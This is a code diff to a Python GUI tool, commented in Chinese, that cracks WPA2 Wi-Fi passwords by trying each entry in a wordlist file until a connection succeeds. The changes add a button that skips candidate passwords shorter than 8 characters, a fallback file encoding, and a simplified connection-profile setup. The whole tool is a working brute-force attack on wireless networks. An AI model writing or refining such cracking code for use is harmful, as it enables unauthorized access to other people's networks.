@@ -31,6 +31,7 @@ class MY_GUI():
         self.mylog = None                                                 # 日志框
         self.waitime = IntVar(value=5)                                    # 连接等待时长
         self.codeSet = False                                              # 默认不使用特殊编码
+        self.exclude = True                                               # 默认排除长度小于8的密码
 
     def usefuc(self):
         how_to_use = Toplevel(master=self.myWindow)
@@ -64,6 +65,12 @@ class MY_GUI():
         else:
             self.codeSet = True
         self.mylog.insert_and_see('编码已更改, 请重新搜索wifi.')
+    
+    def change_exclude(self):
+        if self.exclude:
+            self.exclude = False
+        else:
+            self.exclude = True
 
     def set_init_window(self):
         # ********* 窗口配置 ********
@@ -122,6 +129,7 @@ class MY_GUI():
         Label(labelframe, text="WIFI密码: ").grid(column=0, row=2, sticky=W)
         Entry(labelframe, width=22, textvariable=self.get_wifipwd_value).grid(column=1, row=2, sticky=W, padx=1, pady=5)
         Button(labelframe, text='测试连接', command=lambda:self.work_in_back(self.testConnect)).grid(column=2, row=2, sticky=W, pady=5, padx=10)
+        Button(labelframe, text='排除/包含长度小于8的密码', command=lambda:self.change_exclude()).grid(column=3, row=2)
         Label(labelframe, text='可以尝试输入密码测试连接热点的速度, 并适当调整连接等待时间', font=('',9), fg='red').place(x=0, y=120)
 
         Label(labelframe, text='连接等待时长: ').grid(column=0, row=3, pady=24)
@@ -218,12 +226,15 @@ class MY_GUI():
                 encoding = result['encoding']
         except Exception as e:
             self.mylog.insert_and_see(e)
+            encoding='utf-8'
 
         with open(filePath, "r", errors="ignore", encoding=encoding) as pwd_file:
             for pwd in pwd_file:
                 # 每次循环都应该单独设置一个异常检测，防止因为其中一个密码导致的错误使程序停止运行
                 try:
                     self.mylog.insert_and_see(f"正在尝试密码 {pwd.strip()}...")
+                    if len(pwd.strip()) < 8 and self.exclude:    # 自动排除字符长度小于 8 的密码
+                        continue
                     if self.connect(pwd.strip(), wifi_ssid, crack=True):
                         self.get_wifipwd_value.set(pwd.strip())
                         self.mylog.insert_and_see(f'破解成功，密码：{pwd.strip()}')
@@ -240,14 +251,11 @@ class MY_GUI():
         profile.ssid = wifi_ssid
         profile.auth = const.AUTH_ALG_OPEN
         profile.akm = const.AKM_TYPE_WPA2PSK
+        # profile.akm.append(const.AKM_TYPE_WPA2PSK) # linux 可能需要该语句
         profile.cipher = const.CIPHER_TYPE_CCMP
         profile.key = pwd_str
         self.iface.remove_all_network_profiles()
-        try:
-            tmp_profile = self.iface.add_network_profile(profile)
-        except:
-            profile.akm.append(const.AKM_TYPE_WPA2PSK)  # 如果报错则改为列表追加而非赋值
-            tmp_profile = self.iface.add_network_profile(profile)
+        tmp_profile = self.iface.add_network_profile(profile)
         self.iface.connect(tmp_profile)
         # 破解模式
         if crack:
